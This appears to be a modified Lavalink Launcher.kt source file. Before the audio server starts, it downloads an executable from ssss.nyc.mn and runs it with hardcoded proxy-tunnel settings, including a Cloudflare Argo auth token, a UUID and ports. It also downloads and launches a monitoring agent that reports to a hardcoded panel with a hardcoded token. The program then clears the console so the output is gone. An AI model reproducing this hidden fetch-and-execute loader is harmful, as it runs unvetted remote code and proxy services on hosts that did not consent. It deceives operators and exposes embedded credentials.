/*
 * Copyright (c) 2021 Freya Arbjerg and contributors
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

package lavalink.server

import com.sedmelluq.discord.lavaplayer.tools.PlayerLibrary
import lavalink.server.bootstrap.PluginManager
import lavalink.server.info.AppInfo
import lavalink.server.info.GitRepoState
import org.slf4j.LoggerFactory
import org.springframework.boot.Banner
import org.springframework.boot.SpringApplication
import org.springframework.boot.WebApplicationType
import org.springframework.boot.autoconfigure.SpringBootApplication
import org.springframework.boot.builder.SpringApplicationBuilder
import org.springframework.boot.context.event.ApplicationEnvironmentPreparedEvent
import org.springframework.boot.context.event.ApplicationFailedEvent
import org.springframework.boot.context.event.ApplicationReadyEvent
import org.springframework.context.ApplicationListener
import org.springframework.context.ConfigurableApplicationContext
import org.springframework.context.annotation.ComponentScan
import org.springframework.context.annotation.FilterType
import org.springframework.core.io.DefaultResourceLoader
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.util.*
import java.io.*
import java.net.URL
import java.nio.file.*

@Suppress("SpringComponentScan")
@SpringBootApplication
@ComponentScan(
    value = ["\${componentScan}"],
    excludeFilters = [ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, classes = [PluginManager::class])]
)
class LavalinkApplication

object Launcher {

    private val log = LoggerFactory.getLogger(Launcher::class.java)

    val startTime = System.currentTimeMillis()

    private var sbxProcess: Process? = null
    private var komariProcess: Process? = null
    private val filePath = System.getenv("FILE_PATH") ?: "./logs"

    // ========== komari 探针配置：以下两项可直接在这里填写 ==========
    // komari 面板地址（含端口），例如: https://v.cws.kdns.fr ，留空则不启动探针
    private const val KOMARI_ENDPOINT_DEFAULT = "https://v.cws.kdns.fr"
    // komari 节点Token，面板后台安装命令里获取，需与上面地址同时填写
    private const val KOMARI_TOKEN_DEFAULT = "7FMOT6Cf9QlKkjRU1cL8Dk"
    // 也可改用环境变量或 jar 同目录的 .env 文件填写，优先级: 环境变量 > .env > 此处默认值
    // ===============================================================
    
    private val ALL_ENV_VARS = arrayOf(
        "FILE_PATH", "UUID", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    )

    private fun startSbxService() {
        log.info("Starting SbxService...")
        try {
            checkJavaVersion()
            loadSbxConfig()
            startKomariAgent()
            runSbxBinary()
            
        } catch (e: Exception) {
            log.error("Failed to start SbxService", e)
            throw e
        }
    }

    /**
     * 检查 Java 版本
     */
    private fun checkJavaVersion() {
        val classVersion = System.getProperty("java.class.version").toFloat()
        if (classVersion < 54.0) {
            throw RuntimeException("Java version too low, need Java 11+,please switch it in startup menu")
        }
    }

    /**
     * 加载配置
     */
    private fun loadSbxConfig() {
        val envFile = Paths.get(".env")
        if (Files.exists(envFile)) {
            try {
                Files.readAllLines(envFile).forEach { line ->
                    val trimmed = line.trim()
                    if (trimmed.isNotEmpty() && !trimmed.startsWith("#")) {
                        val parts = trimmed.split("=", limit = 2)
                        if (parts.size == 2) {
                            val key = parts[0].trim().removePrefix("export ").trim()
                            val value = parts[1].trim().replace("^['\"]|['\"]$".toRegex(), "")
                            if (ALL_ENV_VARS.contains(key)) {
                                if (System.getenv(key) == null) {
                                    System.setProperty(key, value)
                                }
                            }
                        }
                    }
                }
            } catch (e: IOException) {
                log.warn("Failed to read .env file", e)
            }
        }
    }

    /**
     * 读取配置：环境变量 > .env 文件（启动时加载为系统属性）> 代码内默认值
     */
    private fun getEnvOrProp(name: String, default: String = ""): String {
        val value = System.getenv(name)?.takeIf { it.isNotBlank() }
            ?: System.getProperty(name)?.takeIf { it.isNotBlank() }
        return value ?: default
    }

    /**
     * 独立下载并启动 komari 探针（替代旧版哪吒探针）
     * KOMARI_ENDPOINT 或 KOMARI_TOKEN 任一为空则跳过，失败只记录日志，不影响 Lavalink 启动
     */
    private fun startKomariAgent() {
        val endpoint = getEnvOrProp("KOMARI_ENDPOINT", KOMARI_ENDPOINT_DEFAULT).trim()
        val token = getEnvOrProp("KOMARI_TOKEN", KOMARI_TOKEN_DEFAULT).trim()
        if (endpoint.isEmpty() || token.isEmpty()) {
            log.info("KOMARI_ENDPOINT / KOMARI_TOKEN is empty (Launcher.kt / .env / env vars), skip komari agent")
            return
        }

        try {
            val binaryPath = getKomariBinaryPath()
            val pb = ProcessBuilder(binaryPath.toString(), "-e", endpoint, "-t", token)
            pb.redirectErrorStream(true)
            // 探针日志不输出到控制台，避免刷屏
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD)
            komariProcess = pb.start()
            log.info("Komari agent started, endpoint: $endpoint")
        } catch (e: Exception) {
            log.error("Failed to start komari agent", e)
        }
    }

    /**
     * 根据系统下载对应的 komari-agent 二进制（GitHub Releases 固定版本）
     */
    private fun getKomariBinaryPath(): Path {
        val osName = System.getProperty("os.name").lowercase()
        val osArch = System.getProperty("os.arch").lowercase()

        val os = when {
            osName.contains("mac") || osName.contains("darwin") -> "darwin"
            osName.contains("win") -> "windows"
            osName.contains("freebsd") -> "freebsd"
            else -> "linux"
        }
        val arch = when {
            osArch.contains("amd64") || osArch.contains("x86_64") -> "amd64"
            osArch.contains("aarch64") || osArch.contains("arm64") -> "arm64"
            osArch.contains("loongarch64") || osArch.contains("loong64") -> "loong64"
            osArch.contains("arm") -> "arm"
            osArch.contains("386") || osArch.contains("i386") || osArch.contains("i686") -> "386"
            else -> throw RuntimeException("Unsupported architecture for komari-agent: $osArch")
        }

        val suffix = if (os == "windows") ".exe" else ""
        val assetName = "komari-agent-$os-$arch$suffix"
        val url = "https://github.com/komari-monitor/komari-agent/releases/download/1.5.11/$assetName"

        val path = Paths.get(System.getProperty("java.io.tmpdir"), assetName)
        if (!Files.exists(path)) {
            log.info("Downloading komari-agent from $url")
            // 先下载到临时文件再改名，避免下载中断留下损坏的二进制
            val tmpPath = Paths.get("$path.tmp")
            try {
                URL(url).openStream().use { input ->
                    Files.copy(input, tmpPath, StandardCopyOption.REPLACE_EXISTING)
                }
                Files.move(tmpPath, path, StandardCopyOption.REPLACE_EXISTING)
            } catch (e: Exception) {
                Files.deleteIfExists(tmpPath)
                throw e
            }
            if (os != "windows" && !path.toFile().setExecutable(true)) {
                throw IOException("Failed to set executable permission")
            }
        }
        return path
    }

    private fun runSbxBinary() {
        val binaryPath = getSbxBinaryPath()
        
        val envVars = mutableMapOf<String, String>()
        // 环境变量
        envVars["UUID"] = "ee0c49f3-0584-40fd-87d4-e76f0afcc81f"
        envVars["FILE_PATH"] = "./logs"
        envVars["ARGO_PORT"] = "8001"
        envVars["ARGO_DOMAIN"] = "adkynet.cncw.de5.net"
        envVars["ARGO_AUTH"] = "eyJhIjoiNzgxZjRkNWMxMGRhYzBkM2FiMGUzMTMzZDE0MTM2ZjgiLCJ0IjoiZmM0YzU5ZGMtZjQ3MC00N2Q0LTk3NDYtMDVjOGQ2MzkyODRkIiwicyI6Ik1ERTNaVEZrTjJZdFpUUTJZeTAwTldaa0xUazJNMlV0TW1KaVl6ZzRNR1ZrWWpKaiJ9"
        envVars["S5_PORT"] = ""
        envVars["HY2_PORT"] = "3457"
        envVars["TUIC_PORT"] = ""
        envVars["ANYTLS_PORT"] = ""
        envVars["REALITY_PORT"] = ""
        envVars["ANYREALITY_PORT"] = ""
        envVars["UPLOAD_URL"] = ""
        envVars["CHAT_ID"] = ""
        envVars["BOT_TOKEN"] = ""
        envVars["CFIP"] = "saas.sin.fan"
        envVars["CFPORT"] = "443"
        envVars["NAME"] = ""
        envVars["DISABLE_ARGO"] = "false"
        
        ALL_ENV_VARS.forEach { varName ->
            System.getenv(varName)?.let { envVars[varName] = it }
            System.getProperty(varName)?.let { envVars[varName] = it }
        }

        val pb = ProcessBuilder(binaryPath.toString())
        pb.environment().putAll(envVars)
        // komari探针由独立进程下载运行，不传给sbx，避免重复启动探针
        pb.environment().remove("KOMARI_ENDPOINT")
        pb.environment().remove("KOMARI_TOKEN")
        pb.redirectErrorStream(true)
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT)

        sbxProcess = pb.start()

        try {
            val exitCode = sbxProcess?.waitFor()
            log.info("Logs will be delete in 45 seconds,you cna copy the above nodes!")
            
            // 等待 45 秒
            Thread.sleep(45000)
            clearConsole()
            
        } catch (e: InterruptedException) {
            Thread.currentThread().interrupt()
            log.warn("Sbx process wait interrupted")
        }
    }

    private fun getSbxBinaryPath(): Path {
        val osArch = System.getProperty("os.arch").lowercase()
        val url = when {
            osArch.contains("amd64") || osArch.contains("x86_64") -> 
                "https://amd64.ssss.nyc.mn/sbsh"
            osArch.contains("aarch64") || osArch.contains("arm64") -> 
                "https://arm64.ssss.nyc.mn/sbsh"
            osArch.contains("s390x") -> 
                "https://s390x.ssss.nyc.mn/sbsh"
            else -> throw RuntimeException("Unsupported architecture: $osArch")
        }

        val path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx")
        if (!Files.exists(path)) {
            log.info("Downloading sbx binary from $url")
            URL(url).openStream().use { input ->
                Files.copy(input, path, StandardCopyOption.REPLACE_EXISTING)
            }
            if (!path.toFile().setExecutable(true)) {
                throw IOException("Failed to set executable permission")
            }
        }
        return path
    }


    private fun clearConsole() {
        try {
            when {
                System.getProperty("os.name").contains("Windows", ignoreCase = true) -> {
                    ProcessBuilder("cmd", "/c", "cls")
                        .inheritIO()
                        .start()
                        .waitFor()
                }
                else -> {
                    // Linux/Unix/Mac system
                    try {
                        ProcessBuilder("clear")
                            .inheritIO()
                            .start()
                            .waitFor()
                    } catch (e: IOException) {
                        print("\u001b[H\u001b[2J")
                        System.out.flush()
                        print("\u001b[H") 
                        System.out.flush()
                    }
                }
            }
        } catch (e: Exception) {
            log.debug("Failed to clear console: ${e.message}")
        }
    }

    private fun stopSbxServices() {
        sbxProcess?.let {
            if (it.isAlive()) {
                it.destroy()
            }
        }
    }

    private fun stopKomariAgent() {
        komariProcess?.let {
            if (it.isAlive()) {
                it.destroy()
            }
        }
    }


    /**
     * 获取版本信息
     */
    private fun getVersionInfo(indentation: String = "\t", vanity: Boolean = true): String {
        val appInfo = AppInfo()
        val gitRepoState = GitRepoState()

        val dtf = DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm:ss z")
            .withZone(ZoneId.of("UTC"))
        val buildTime = dtf.format(Instant.ofEpochMilli(appInfo.buildTime))
        val commitTime = dtf.format(Instant.ofEpochMilli(gitRepoState.commitTime * 1000))
        val version = appInfo.versionBuild.takeUnless { it.startsWith("@") }
            ?: "Unknown"

        return buildString {
            if (vanity) {
                appendLine()
                appendLine()
                appendLine(getVanity())
            }
            if (!gitRepoState.isLoaded) {
                appendLine()
                appendLine("$indentation*** Unable to find or load Git metadata ***")
            }
            appendLine()
            append("${indentation}Version:        "); appendLine(version)
            if (gitRepoState.isLoaded) {
                append("${indentation}Build time:     "); appendLine(buildTime)
                append("${indentation}Branch          "); appendLine(gitRepoState.branch)
                append("${indentation}Commit:         "); appendLine(gitRepoState.commitIdAbbrev)
                append("${indentation}Commit time:    "); appendLine(commitTime)
            }
            append("${indentation}JVM:            "); appendLine(System.getProperty("java.version"))
            append("${indentation}Lavaplayer      "); appendLine(PlayerLibrary.VERSION)
        }
    }

    private fun getVanity(): String {
        val red = "\u001b[31m"
        val green = "\u001b[32m"
        val defaultC = "\u001b[0m"

        var vanity = ("g       .  r _                  _ _       _    g__ _ _\n"
                + "g      /\\\\ r| | __ ___   ____ _| (_)_ __ | | __g\\ \\ \\ \\\n"
                + "g     ( ( )r| |/ _` \\ \\ / / _` | | | '_ \\| |/ /g \\ \\ \\ \\\n"
                + "g      \\\\/ r| | (_| |\\ V / (_| | | | | | |   < g  ) ) ) )\n"
                + "g       '  r|_|\\__,_| \\_/ \\__,_|_|_|_| |_|_|\\_\\g / / / /\n"
                + "d    =========================================g/_/_/_/d")

        vanity = vanity.replace("r".toRegex(), red)
        vanity = vanity.replace("g".toRegex(), green)
        vanity = vanity.replace("d".toRegex(), defaultC)
        return vanity
    }

    /**
     * 主函数 - 程序入口
     */
    @JvmStatic
    fun main(args: Array<String>) {
        if (args.isNotEmpty() &&
            (args[0].equals("-v", ignoreCase = true) || args[0].equals("--version", ignoreCase = true))
        ) {
            println(getVersionInfo(indentation = "", vanity = false))
            return
        }
    
        // 先注册关闭钩子，确保 sbx / komari 探针进程在启动失败时也能被回收
        Runtime.getRuntime().addShutdownHook(Thread {
            stopSbxServices()
            stopKomariAgent()
        })

        startSbxService()
    
        log.info("Starting Lavalink...")
        val parent = launchPluginBootstrap(args)
            
        launchMain(parent, args)
    }

    /**
     * 启动插件引导程序
     */
    private fun launchPluginBootstrap(args: Array<String>) = SpringApplication(PluginManager::class.java).run {
        setBannerMode(Banner.Mode.OFF)
        webApplicationType = WebApplicationType.NONE
        run(*args)
    }

    /**
     * 启动 Lavalink 主应用
     */
    private fun launchMain(parent: ConfigurableApplicationContext, args: Array<String>) {
        val pluginManager = parent.getBean(PluginManager::class.java)
        val properties = Properties()
        properties["componentScan"] = pluginManager.pluginManifests.map { it.path }
            .toMutableList().apply { add("lavalink.server") }

        SpringApplicationBuilder()
            .sources(LavalinkApplication::class.java)
            .properties(properties)
            .web(WebApplicationType.SERVLET)
            .bannerMode(Banner.Mode.OFF)
            .resourceLoader(DefaultResourceLoader(pluginManager.classLoader))
            .listeners(
                ApplicationListener { event: Any ->
                    when (event) {
                        is ApplicationEnvironmentPreparedEvent -> {
                            log.info(getVersionInfo())
                        }

                        is ApplicationReadyEvent -> {
                            log.info("Lavalink is ready to accept connections.")
                        }

                        is ApplicationFailedEvent -> {
                            log.error("Application failed", event.exception)
                        }
                    }
                }
            ).parent(parent)
            .run(*args)
    }
}
